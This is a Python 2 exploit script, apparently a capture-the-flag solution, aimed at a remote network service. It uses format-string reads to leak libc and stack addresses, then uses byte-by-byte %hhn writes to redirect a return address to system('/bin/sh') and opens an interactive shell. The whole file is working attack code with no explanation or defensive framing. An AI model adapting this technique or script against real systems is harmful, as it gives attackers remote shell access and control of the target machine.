# exploit.py
import sys
import struct
from subprocess import Popen, PIPE
import time

host = "/////./////.info"
port = 10001

import telnetlib
t = telnetlib.Telnet()
t.open(host, port)
#stage0_libc_base------------------------------------------
while True:
        word = t.read_some()
        print word
        if "What" in word:
                break
buf = "%118$08x"
t.write(buf+"\n")
libc = int(t.read_some()[4:12], 16)
libc_base = libc - 0x00016c50 - 0xb
print "[+] libc : %08x" % libc
print "[+] libc_base : %08x" % libc_base

#stage1_saved_ebp_addr_return_addr_base-----------------------
while True:
	word = t.read_some()
	print word
	if "What" in word:
		break
buf = "%78$08x" #saved ebp
t.write(buf+"\n")
addr_ebp = int(t.read_some()[4:12], 16)
addr_return = addr_ebp - 0x2c
print "[+] addr_ebp : %08x" % addr_ebp
print "[+] addr_return : %08x" % addr_return
#end-----------------------------------------

#stage2_return_a_baes_addr--------------------
while True:
        word = t.read_some()
        print word
        if "What" in word:
                break
buf = "%79$08x"
t.write(buf+"\n")
return_a = int(t.read_some()[4:12], 16)
addr_base = return_a - 0x8f1
print "[+] return_a : %08x" % return_a
print "[+] addr_base : %08x" % addr_base
#end------------------------------------------

'''
#stage3_libc_base---------------------------

while True:
        word = t.read_some()
        print word
        if "What" in word:
                break

addr_got_libc_start_main = addr_base + 0x1fbc + 0x14
#+ 0x14 #libc_start_main
#+ 0x28 #puts
print "[+] addr_got_libc_start_main : %08x" % addr_got_libc_start_main
buf = struct.pack('<I', addr_got_libc_start_main)
buf += "%7$s"

time.sleep(1)
t.write(buf+"\n")
t.read_until("Hi, ")
libc_start_main = struct.unpack('<I', t.read_some()[4:8])[0]
print "[+] libc_start_main %08x" % libc_start_main
libc_base2 = libc_start_main - 0x00062b00 # 0x00016c50 start_libc
print "[+] libc_base2 : %08x" % libc_base2
#--------------------------------------------------
'''


#stage4-----------------------------------------
addr_main_return = addr_return + 0x30
addr_sub = addr_main_return + 8
addr_buf = addr_main_return - 0x120
print "[+] addr_main_return : %08x" % addr_main_return
print "[+] add_sub : %08x" % addr_sub
system = libc_base + 0x0003af60
bin_sh = libc_base + 0x156404
print "bin_sh %08x" % bin_sh
while True:
        word = t.read_some()
        print word
        if "What" in word:
                break
index = int(sys.argv[1])

addr = bin_sh

buf = struct.pack('<I', addr_return+8)
buf += struct.pack('<I', addr_return+8+1)
buf += struct.pack('<I', addr_return+8+2)
buf += struct.pack('<I', addr_return+8+3)

a = map(ord, struct.pack('<I', addr))
a[3] = ((a[3]-a[2]-1) % 0x100) + 1
a[2] = ((a[2]-a[1]-1) % 0x100) + 1
a[1] = ((a[1]-a[0]-1) % 0x100) + 1
a[0] = ((a[0]-len(buf)-1) % 0x100) + 1

buf += "%%%dc%%%d$hhn" % (a[0], index)
buf += "%%%dc%%%d$hhn" % (a[1], index+1)
buf += "%%%dc%%%d$hhn" % (a[2], index+2)
buf += "%%%dc%%%d$hhn" % (a[3], index+3)

time.sleep(1)
t.write(buf+"\n")

#---


#--------------------------------------------




while True:
        word = t.read_some()
        print word
        if "What" in word:
                break
addr = system

buf = struct.pack('<I', addr_return)
buf += struct.pack('<I', addr_return+1)
buf += struct.pack('<I', addr_return+2)
buf += struct.pack('<I', addr_return+3)

a = map(ord, struct.pack('<I', addr))
a[3] = ((a[3]-a[2]-1) % 0x100) + 1
a[2] = ((a[2]-a[1]-1) % 0x100) + 1
a[1] = ((a[1]-a[0]-1) % 0x100) + 1
a[0] = ((a[0]-len(buf)-1) % 0x100) + 1

buf += "%%%dc%%%d$hhn" % (a[0], index)
buf += "%%%dc%%%d$hhn" % (a[1], index+1)
buf += "%%%dc%%%d$hhn" % (a[2], index+2)
buf += "%%%dc%%%d$hhn" % (a[3], index+3)

time.sleep(1)
t.write(buf+"\n")
#end----------------------------
time.sleep(1)
t.write('exec <&2 >&2\n')
t.interact()
#t.write('exec <&2 >&2\n')
